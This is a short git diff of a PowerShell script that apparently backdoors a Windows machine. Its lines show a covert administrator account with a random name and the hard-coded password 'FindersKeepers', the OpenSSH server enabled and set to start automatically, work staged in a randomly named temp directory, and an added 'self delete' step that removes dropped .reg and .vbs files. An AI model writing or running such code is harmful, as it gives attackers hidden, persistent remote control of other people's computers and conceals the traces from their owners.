@@ -19,6 +19,15 @@ function createAdmin {
   }
 }
 
+## Temp Directory
+## variables
+$temp = "$env:temp"
+$dirName = randomText
+
+## goto Temp and start 
+Set-Location $temp	
+New-Item -Path $temp -Name $dirName -Type Directory
+
 ## Create Admin
 $uName = randomText
 $pWord = (ConvertTo-SecureString  "FindersKeepers" -AsPlainText -Force)
@@ -42,11 +51,6 @@ Start-Service sshd
 Set-Service -Name sshd -StartupType 'Automatic'
 Get-NetFirewallRule -Name *ssh*
 
-## Temp Directory
-## variables
-$temp = "$env:temp"
-$dirName = randomText
-
-## goto Temp and start 
-Set-Location $temp	
-New-Item -Path $temp -Name $dirName -Type Directory
+## self delete
+Remove-Item ./$regName.reg
+Remove-Item ./$vbsName.vbs
